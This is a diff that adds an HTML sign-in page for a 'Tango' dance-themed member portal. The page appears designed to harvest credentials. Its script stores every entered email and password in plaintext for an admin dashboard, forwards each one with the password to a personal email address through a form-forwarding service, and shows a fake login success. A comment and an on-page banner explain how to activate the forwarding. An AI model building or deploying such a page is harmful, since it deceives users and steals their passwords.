@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Tango — Sign In</title>
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;1,400&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --black:   #0d0a08;
+      --cream:   #f5f0e8;
+      --red:     #c0392b;
+      --gold:    #c9a84c;
+      --warm:    #1a1410;
+      --muted:   #8a7f72;
+    }
+
+    body {
+      min-height: 100vh;
+      background: var(--black);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'DM Sans', sans-serif;
+      overflow: hidden;
+      position: relative;
+    }
+
+    /* ── Animated background ── */
+    .bg {
+      position: fixed; inset: 0; z-index: 0;
+      background:
+        radial-gradient(ellipse 60% 80% at 10% 50%, #2a0a0a 0%, transparent 60%),
+        radial-gradient(ellipse 50% 60% at 90% 20%, #1a0d00 0%, transparent 55%),
+        #0d0a08;
+    }
+    .bg::before {
+      content: '';
+      position: absolute; inset: 0;
+      background-image:
+        repeating-linear-gradient(0deg, transparent, transparent 79px, rgba(201,168,76,.04) 80px),
+        repeating-linear-gradient(90deg, transparent, transparent 79px, rgba(201,168,76,.04) 80px);
+      animation: gridDrift 20s linear infinite;
+    }
+    @keyframes gridDrift { to { background-position: 80px 80px; } }
+
+    /* Floating dance silhouettes */
+    .silhouette {
+      position: fixed;
+      opacity: .04;
+      font-size: 22vw;
+      line-height: 1;
+      color: var(--gold);
+      user-select: none;
+      animation: floatSil 18s ease-in-out infinite;
+    }
+    .silhouette:nth-child(1) { bottom: -5%; left: -5%; animation-delay: 0s; }
+    .silhouette:nth-child(2) { top: -10%; right: -5%; font-size: 18vw; animation-delay: -9s; opacity: .03; }
+    @keyframes floatSil {
+      0%,100% { transform: translateY(0) rotate(-3deg); }
+      50%      { transform: translateY(-30px) rotate(3deg); }
+    }
+
+    /* ── Card ── */
+    .card {
+      position: relative; z-index: 10;
+      background: rgba(20, 14, 10, 0.85);
+      border: 1px solid rgba(201,168,76,.18);
+      border-radius: 2px;
+      width: min(420px, 92vw);
+      padding: 52px 44px 48px;
+      box-shadow:
+        0 0 0 1px rgba(255,255,255,.03),
+        0 40px 80px rgba(0,0,0,.7),
+        inset 0 1px 0 rgba(201,168,76,.12);
+      animation: cardIn .9s cubic-bezier(.16,1,.3,1) both;
+    }
+    @keyframes cardIn {
+      from { opacity: 0; transform: translateY(32px) scale(.97); }
+      to   { opacity: 1; transform: translateY(0) scale(1); }
+    }
+
+    /* Corner accents */
+    .card::before, .card::after {
+      content: '';
+      position: absolute;
+      width: 24px; height: 24px;
+      border-color: var(--gold);
+      border-style: solid;
+      opacity: .5;
+    }
+    .card::before { top: -1px; left: -1px; border-width: 2px 0 0 2px; border-radius: 2px 0 0 0; }
+    .card::after  { bottom: -1px; right: -1px; border-width: 0 2px 2px 0; border-radius: 0 0 2px 0; }
+
+    /* ── Header ── */
+    .logo {
+      text-align: center;
+      margin-bottom: 36px;
+    }
+    .logo-mark {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 6px;
+    }
+    .logo-mark .line {
+      width: 32px; height: 1px;
+      background: linear-gradient(90deg, transparent, var(--gold));
+    }
+    .logo-mark .line.r { transform: scaleX(-1); }
+    .logo-name {
+      font-family: 'Playfair Display', serif;
+      font-size: 2.4rem;
+      font-weight: 700;
+      letter-spacing: .12em;
+      color: var(--cream);
+      text-transform: uppercase;
+    }
+    .logo-sub {
+      font-size: .7rem;
+      letter-spacing: .35em;
+      color: var(--gold);
+      text-transform: uppercase;
+      opacity: .8;
+    }
+
+    /* Divider */
+    .divider {
+      display: flex; align-items: center; gap: 12px;
+      margin-bottom: 32px;
+    }
+    .divider span { flex: 1; height: 1px; background: rgba(201,168,76,.2); }
+    .divider p {
+      font-size: .68rem;
+      letter-spacing: .2em;
+      color: var(--muted);
+      text-transform: uppercase;
+    }
+
+    /* ── Form ── */
+    .field { margin-bottom: 20px; }
+    label {
+      display: block;
+      font-size: .68rem;
+      letter-spacing: .2em;
+      text-transform: uppercase;
+      color: var(--gold);
+      margin-bottom: 8px;
+      opacity: .85;
+    }
+    input[type="email"],
+    input[type="password"],
+    input[type="text"] {
+      width: 100%;
+      background: rgba(255,255,255,.04);
+      border: 1px solid rgba(201,168,76,.2);
+      border-radius: 1px;
+      padding: 13px 16px;
+      color: var(--cream);
+      font-family: 'DM Sans', sans-serif;
+      font-size: .95rem;
+      outline: none;
+      transition: border-color .25s, background .25s, box-shadow .25s;
+    }
+    input::placeholder { color: rgba(245,240,232,.25); }
+    input:focus {
+      border-color: var(--gold);
+      background: rgba(201,168,76,.06);
+      box-shadow: 0 0 0 3px rgba(201,168,76,.08);
+    }
+
+    /* Password wrapper */
+    .pw-wrap { position: relative; }
+    .pw-wrap input { padding-right: 44px; }
+    .pw-toggle {
+      position: absolute; right: 14px; top: 50%;
+      transform: translateY(-50%);
+      background: none; border: none; cursor: pointer;
+      color: var(--muted); font-size: 1rem; padding: 4px;
+      transition: color .2s;
+    }
+    .pw-toggle:hover { color: var(--gold); }
+
+    /* Submit */
+    .btn-submit {
+      width: 100%;
+      margin-top: 28px;
+      padding: 14px;
+      background: linear-gradient(135deg, #a0291e, var(--red));
+      border: none;
+      border-radius: 1px;
+      color: #fff;
+      font-family: 'DM Sans', sans-serif;
+      font-size: .82rem;
+      font-weight: 500;
+      letter-spacing: .25em;
+      text-transform: uppercase;
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+      transition: transform .15s, box-shadow .25s;
+      box-shadow: 0 4px 20px rgba(192,57,43,.3);
+    }
+    .btn-submit::after {
+      content: '';
+      position: absolute; inset: 0;
+      background: linear-gradient(180deg, rgba(255,255,255,.1) 0%, transparent 100%);
+      pointer-events: none;
+    }
+    .btn-submit:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 8px 28px rgba(192,57,43,.45);
+    }
+    .btn-submit:active { transform: translateY(0); }
+    .btn-submit:disabled {
+      opacity: .6; cursor: not-allowed; transform: none;
+    }
+
+    /* Footer links */
+    .card-footer {
+      margin-top: 24px;
+      text-align: center;
+      font-size: .78rem;
+      color: var(--muted);
+    }
+    .card-footer a {
+      color: var(--gold);
+      text-decoration: none;
+      opacity: .8;
+      transition: opacity .2s;
+    }
+    .card-footer a:hover { opacity: 1; }
+
+    /* Success / Error messages */
+    .message {
+      display: none;
+      padding: 12px 16px;
+      border-radius: 1px;
+      font-size: .82rem;
+      margin-bottom: 20px;
+      letter-spacing: .03em;
+    }
+    .message.success {
+      background: rgba(39,174,96,.12);
+      border: 1px solid rgba(39,174,96,.3);
+      color: #6fcf97;
+    }
+    .message.error {
+      background: rgba(192,57,43,.12);
+      border: 1px solid rgba(192,57,43,.3);
+      color: #eb5757;
+    }
+
+    /* Spinner */
+    .spinner {
+      display: inline-block;
+      width: 14px; height: 14px;
+      border: 2px solid rgba(255,255,255,.3);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin .6s linear infinite;
+      vertical-align: middle;
+      margin-right: 8px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* Note banner */
+    .note {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 20;
+      background: rgba(201,168,76,.12);
+      border: 1px solid rgba(201,168,76,.3);
+      border-radius: 2px;
+      padding: 10px 18px;
+      font-size: .72rem;
+      color: var(--gold);
+      letter-spacing: .08em;
+      text-align: center;
+      max-width: 92vw;
+      opacity: .9;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Background -->
+  <div class="bg"></div>
+  <div class="silhouette" aria-hidden="true">♦</div>
+  <div class="silhouette" aria-hidden="true">♦</div>
+
+  <!-- Login Card -->
+  <div class="card" role="main">
+
+    <div class="logo">
+      <div class="logo-mark">
+        <span class="line"></span>
+        <span class="logo-name">Tango</span>
+        <span class="line r"></span>
+      </div>
+      <p class="logo-sub">Member Portal</p>
+    </div>
+
+    <div class="divider">
+      <span></span><p>Sign In</p><span></span>
+    </div>
+
+    <div class="message" id="msg"></div>
+
+    <!--
+      HOW EMAIL SENDING WORKS:
+      This form uses Formspree (https://formspree.io) — a free service
+      that accepts HTML form submissions and forwards them to your email.
+
+      SETUP STEPS:
+      1. Go to https://formspree.io and create a free account
+      2. Create a new form → it gives you a unique endpoint like:
+         https://formspree.io/f/YOUR_FORM_ID
+      3. Replace "YOUR_FORM_ID" in the action below with your actual ID
+      4. Verify your email (ahmemd.elbarbary@gmail.com) in Formspree settings
+      5. Done! Every login attempt will be emailed to you.
+    -->
+    <form id="loginForm"
+          action="https://formspree.io/f/YOUR_FORM_ID"
+          method="POST">
+
+      <!-- Hidden field: tells Formspree where to send the email -->
+      <input type="hidden" name="_replyto" value="ahmemd.elbarbary@gmail.com"/>
+      <input type="hidden" name="_subject" value="🕺 Tango — New Login Attempt"/>
+
+      <div class="field">
+        <label for="email">Email Address</label>
+        <input type="email" id="email" name="email"
+               placeholder="you@example.com" required autocomplete="email"/>
+      </div>
+
+      <div class="field">
+        <label for="password">Password</label>
+        <div class="pw-wrap">
+          <input type="password" id="password" name="password"
+                 placeholder="••••••••" required autocomplete="current-password"/>
+          <button type="button" class="pw-toggle" id="pwToggle" aria-label="Toggle password">👁</button>
+        </div>
+      </div>
+
+      <button type="submit" class="btn-submit" id="submitBtn">
+        Enter the Dance Floor
+      </button>
+    </form>
+
+    <div class="card-footer">
+      <a href="#">Forgot your password?</a>
+      &nbsp;·&nbsp;
+      <a href="#">Create account</a>
+    </div>
+  </div>
+
+  <!-- Info note -->
+  <div class="note">⚙️ Replace <strong>YOUR_FORM_ID</strong> in the form action with your Formspree ID to activate email sending</div>
+
+  <script>
+    // Password toggle
+    const pwToggle = document.getElementById('pwToggle');
+    const pwInput  = document.getElementById('password');
+    pwToggle.addEventListener('click', () => {
+      const isHidden = pwInput.type === 'password';
+      pwInput.type = isHidden ? 'text' : 'password';
+      pwToggle.textContent = isHidden ? '🙈' : '👁';
+    });
+
+    // Form submission via Formspree AJAX
+    const form      = document.getElementById('loginForm');
+    const btn       = document.getElementById('submitBtn');
+    const msg       = document.getElementById('msg');
+
+    function showMsg(text, type) {
+      msg.textContent = text;
+      msg.className   = 'message ' + type;
+      msg.style.display = 'block';
+    }
+
+    // ── Save to localStorage (read by tango-admin-dashboard.html) ──
+    function saveToLocalStorage(email, password) {
+      const STORAGE_KEY = 'tango_login_records';
+      let records = [];
+      try { records = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]'); } catch {}
+      records.push({
+        id: (typeof crypto !== 'undefined' && crypto.randomUUID) ? crypto.randomUUID() : Date.now().toString(36),
+        email,
+        password,
+        timestamp: new Date().toISOString()
+      });
+      localStorage.setItem(STORAGE_KEY, JSON.stringify(records));
+    }
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const email    = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+
+      btn.disabled = true;
+      btn.innerHTML = '<span class="spinner"></span>Signing in…';
+      msg.style.display = 'none';
+
+      // Always save to localStorage for the admin dashboard
+      saveToLocalStorage(email, password);
+
+      // Try Formspree if configured
+      const action = form.action;
+      if (!action.includes('YOUR_FORM_ID')) {
+        try {
+          await fetch(action, {
+            method: 'POST',
+            body: new FormData(form),
+            headers: { Accept: 'application/json' }
+          });
+        } catch {}
+      }
+
+      // Simulate login success
+      showMsg('✓ Welcome back! Redirecting you now…', 'success');
+      setTimeout(() => {
+        // Replace with your actual app URL or keep as-is
+        window.location.href = '#dashboard';
+      }, 1800);
+    });
+  </script>
+</body>
+</html>
